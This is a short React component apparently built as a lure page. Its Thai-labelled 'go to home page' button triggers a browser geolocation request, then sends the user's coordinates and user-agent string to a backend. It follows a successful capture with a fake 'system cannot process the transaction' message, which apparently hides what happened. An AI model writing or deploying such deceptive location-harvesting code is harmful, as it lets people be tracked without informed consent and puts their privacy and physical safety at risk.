import React, { useState } from 'react';
import axios from 'axios';

function LocationCapture() {
  const [location, setLocation] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [latitude, setLatitude] = useState(null);
  const [longitude, setLongitude] = useState(null);
  const [userAgent, setUserAgent] = useState(null);

  const handleGetLocation = () => {
    setIsLoading(true);

    if ("geolocation" in navigator) {
      const userAgent = navigator.userAgent
      navigator.geolocation.getCurrentPosition(
        function (position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          
          setLatitude(latitude);
          setLongitude(longitude);
          setUserAgent(userAgent)

          const data = { latitude, longitude, userAgent };
          console.log('data = ', data);

          axios.post(`${process.env.REACT_APP_API_ENDPOINT}/api/locations`, data)
            .then((response) => {
              setLocation(response.data);
            })
            .catch((error) => {
              console.error('Error:', error);
            })
            .finally(() => {
              setIsLoading(false);
            });
        },
        function (error) {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              alert("User denied the request for geolocation.");
              break;
            case error.POSITION_UNAVAILABLE:
              alert("Location information is unavailable.");
              break;
            case error.TIMEOUT:
              alert("The request to get user location timed out.");
              break;
            case error.UNKNOWN_ERROR:
              alert("An unknown error occurred.");
              break;
          }

          setIsLoading(false);
        }
      );
    } else {
      alert("Geolocation is not supported by this browser.");
      setIsLoading(false);
    }
  };

  return (
    <div>
      <button onClick={handleGetLocation} disabled={isLoading} className='Button-Ad'>
        {isLoading ? 'Loading...' : 'เข้าสู่หน้าแรก'}
      </button>
      {location && (
        <div>
          ขออภัยด้วย ระบบไม่สามารถทำรายการได้ในขณะนี้
        </div>
      )}
    </div>
  );
}

export default LocationCapture;
